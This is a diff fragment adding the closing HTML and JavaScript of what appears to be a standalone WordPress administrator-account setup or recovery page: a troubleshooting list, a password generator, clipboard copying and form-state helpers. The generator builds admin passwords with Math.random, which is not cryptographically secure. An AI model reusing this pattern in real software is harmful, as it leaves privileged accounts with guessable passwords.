+                        <li>Check file permissions for wp-config.php</li>
+                        <li>Verify WordPress table prefix (default: wp_)</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <?php endif; ?>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // Generate random password
+        function generateNewPassword() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
+            let password = '';
+            for (let i = 0; i < 12; i++) {
+                password += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            document.querySelector('input[name="admin_pass"]').value = password;
+        }
+        
+        // Copy to clipboard
+        function copyToClipboard(elementId) {
+            const element = document.getElementById(elementId);
+            const text = element.innerText;
+            
+            navigator.clipboard.writeText(text).then(() => {
+                // Show temporary notification
+                const btn = event.target.closest('button');
+                const originalHtml = btn.innerHTML;
+                btn.innerHTML = '<i class="fas fa-check"></i>';
+                setTimeout(() => {
+                    btn.innerHTML = originalHtml;
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+        
+        // Show loading indicator
+        function showLoading() {
+            const btn = document.getElementById('submitBtn');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<span class="loading"></span> Processing...';
+            btn.disabled = true;
+            
+            // Re-enable after 10 seconds (safety)
+            setTimeout(() => {
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }, 10000);
+        }
+        
+        // Auto-generate password on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            generateNewPassword();
+        });
+        
+        // Confirm before leaving if form is dirty
+        let formChanged = false;
+        document.querySelectorAll('input, textarea').forEach(element => {
+            element.addEventListener('change', () => {
+                formChanged = true;
+            });
+        });
+        
+        window.addEventListener('beforeunload', function(e) {
+            if (formChanged) {
+                e.preventDefault();
+                e.returnValue = 'You have unsaved changes!';
+            }
+        });
+    </script>
+</body>
+</html>
 <?php endif; ?>
